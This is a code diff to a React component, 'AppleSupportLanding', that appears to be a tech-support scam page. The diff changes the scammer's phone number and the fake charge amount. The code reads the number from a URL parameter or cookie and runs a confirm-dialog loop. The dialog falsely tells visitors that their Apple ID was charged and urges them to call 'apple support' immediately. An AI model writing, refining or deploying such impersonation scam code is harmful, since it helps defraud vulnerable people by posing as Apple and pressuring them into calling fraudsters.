@@ -43,7 +43,7 @@ const cookieHelper = {
 };
 
 const AppleSupportLanding = () => {
-  const [phone, setPhone] = useState('+1(888)824-0388');
+  const [phone, setPhone] = useState('+1(888)824-0844');
   const [displayText, setDisplayText] = useState('');
   const resultRef = useRef(null);
 
@@ -66,7 +66,7 @@ const AppleSupportLanding = () => {
     // 1. Phone Resolution
     const paramPhone = urlParams.get('phone');
     const cookiePhone = cookieHelper.get('phoneSetBl');
-    const activePhone = cookiePhone || paramPhone || '+1(888)824-0388';
+    const activePhone = cookiePhone || paramPhone || '+1(888)824-0844';
     setPhone(activePhone);
 
     // 2. Device Detection
@@ -127,7 +127,7 @@ const AppleSupportLanding = () => {
     // 6. Confirm Dialog Loop
     const runConfirmLoop = () => {
       const msg =
-        `Your Apple ID was recently used at APPLE STORE for $129.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${activePhone} to Freeze it!`;
+        `Your Apple ID was recently used at APPLE STORE for $268.75 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${activePhone} to Freeze it!`;
 
       // Trigger action on any user response
       window.confirm(msg);
